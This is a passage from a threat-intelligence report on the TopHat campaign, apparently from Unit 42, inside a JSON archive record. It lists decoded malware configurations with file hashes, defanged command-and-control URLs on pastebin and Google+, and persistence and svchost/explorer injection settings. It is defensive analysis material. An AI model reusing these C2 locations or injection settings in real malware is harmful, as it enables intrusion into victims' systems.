]com/104518099222750189969[/param]\n\n\n-----\n\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n\n\n\n[nick_name]k1et333d[/nick_name]\n\n[install_folder]noinstall[/install_folder]\n\n[reg_startup]false[/reg_startup]\n\n[folder_startup]false[/folder_startup]\n\n[task_startup]false[/task_startup]\n\n[injection]true[/injection]\n\n[injection_process]svchost[/injection_process]\n\ned9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a48\n\n[config]\n\n[connection]\n\n[param]https://plus.google[.]com/104518099222750189969[/param]\n\n[param]https://plus.google[.]com/110228699051788231047[/param]\n\n[param]https://plus.google[.]com/106456556287604120942[/param]\n\n[/connection]\n\n[install_name]Q2xm5ziY[/install_name]\n\n[nick_name]hq5GyQ1D[/nick_name]\n\n[install_folder]noinstall[/install_folder]\n\n[reg_startup]false[/reg_startup]\n\n[folder_startup]false[/folder_startup\n\n[task_startup]false[/task_startup]\n\n[injection]false[/injection]\n\n613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bb\n\n[config]\n\n[connection]\n\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n\n[param]http://pastebin[.]com/raw/trZZJTGA[/param]\n\n[/connection]\n\n[install_name]e3HGAiPJ[/install_name]\n\n[nick_name]4c1h7vLX[/nick_name]\n\n[install_folder]noinstall[/install_folder]\n\n[reg_startup]false[/reg_startup]\n\n[folder_startup]false[/folder_startup]\n\n[task_startup]false[/task_startup]\n\n[injection]true[/injection]\n\n[injection_process]svchost[/injection_process]\n\n03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df\n\n[config]\n\n[connection]\n\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n\n[param]http://pastebin[.]com/raw/trZZJTGA[/param]\n\n[/connection]\n\n[install_name]i0c9488I[/install_name]\n\n[nick_name]7WDyDSog[/nick_name]\n\n[install_folder]noinstall[/install_folder]\n\n[reg_startup]false[/reg_startup]\n\n[folder_startup]false[/folder_startup]\n\n[task_startup]false[/task_startup]\n\n[injection]true[/injection]\n\n[injection_process]svchost[/injection_process]\n\n0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7\n\n[config]\n\n[connection]\n\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n\n[param]http://pastebin[.]com/raw/trZZJTGA[/param]\n\n[/connection]\n\n[install_name]ZVLhWo62[/install_name]\n\n[nick_name]b04bc9mK[/nick_name]\n\n[install_folder]noinstall[/install_folder]\n\n[reg_startup]false[/reg_startup]\n\n[folder_startup]false[/folder_startup]\n\n[task_startup]false[/task_startup]\n\n[injection]true[/injection]\n\n[injection_process]svchost[/injection_process]\n\nd0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf8\n\n[config]\n\n\n-----\n\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n\n\n\n[nick_name]URt7b1zK[/nick_name]\n\n[install_folder]temp[/install_folder]\n\n[reg_startup]false[/reg_startup]\n\n[folder_startup]false[/folder_startup]\n\n[task_startup]true[/task_startup]\n\n[injection]true[/injection]\n\n[injection_process]svchost[/injection_process]\n\n7b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3\n\n[config]\n\n[connection]\n\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n\n[/connection]\n\n[install_name]ke6Wox2L[/install_name]\n\n[nick_name]3GlWhgi3[/nick_name]\n\n[install_folder]noinstall[/install_folder]\n\n[reg_startup]false[/reg_startup]\n\n[folder_startup]true[/folder_startup]\n\n[task_startup]false[/task_startup]\n\n[injection]true[/injection]\n\n[injection_process]explorer[/injection_process]\n\n##### Got something to say?\n\nLeave a comment...\n\n**Notify me of followup comments via e-mail**\n\n\nName (required)\n\n\nEmail (required)\n\n\nWebsite\n\n\nSUBMIT\n\n**SUBSCRIBE TO NEWSLETTERS**\n\nEmail\n\n**COMPANY**\n\n[Company (https://www paloaltonetworks com/company)](https://www.paloaltonetworks.com/company)\n\n\n-----\n\n[Report a Vulnerability (https://www.paloaltonetworks.com/security disclosure)](https://www.paloaltonetworks.com/security-disclosure)\n\n**LEGAL NOTICES**\n\n[Privacy Policy (https://www.paloaltonetworks.com/legal-notices/privacy)](https://www.paloaltonetworks.com/legal-notices/privacy)\n\n[Terms of Use (https://www.paloaltonetworks.com/legal-notices/terms-of-use)](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n**ACCOUNT**\n\n[Manage Subscription (https://www.paloaltonetworks.com/company/subscriptions)](https://www.paloaltonetworks.com/company/subscriptions)\n\n##  (https://www.linkedin.com/company/palo-alto-networks)   (https://www.facebook.com/PaloAltoNetworks/)   (https://twitter.com/PaloAltoNtwks)\n\n(https://ignite.paloaltonetworks.com/usa/?\n\nCampaignId=7010g000001IH8U&utm_content=Ignite18USA&utm_medium=390x90banner&utm_source=website)\n\n© 2016 Palo Alto Networks, Inc. All rights reserved.\n\n\nSALES > 866.320.4788 \n\n\nSEE A DEMO \n\n\n[TAKE A TEST DRIVE (HTTP://CONNECT.PALOALTONETWORKS.COM/VIRTUAL-UTD)](http://connect.paloaltonetworks.com/virtual-utd)\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.01.26.TopHat_Campaign/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services.pdf"
    ],
    "report_names": [
        "unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1517372870,
    "ts_modification_date": 1517372870,
    "files": {
        "pdf": "https://archive.orkl.eu/8c10db53c54a7b7fd8644cfd7e2bc8da4edb4d37.pdf",
        "text": "https://archive.orkl.eu/8c10db53c54a7b7fd8644cfd7e2bc8da4edb4d37.txt",
        "img": "https://archive.orkl.eu/8c10db53c54a7b7fd8644cfd7e2bc8da4edb4d37.jpg"
    }
}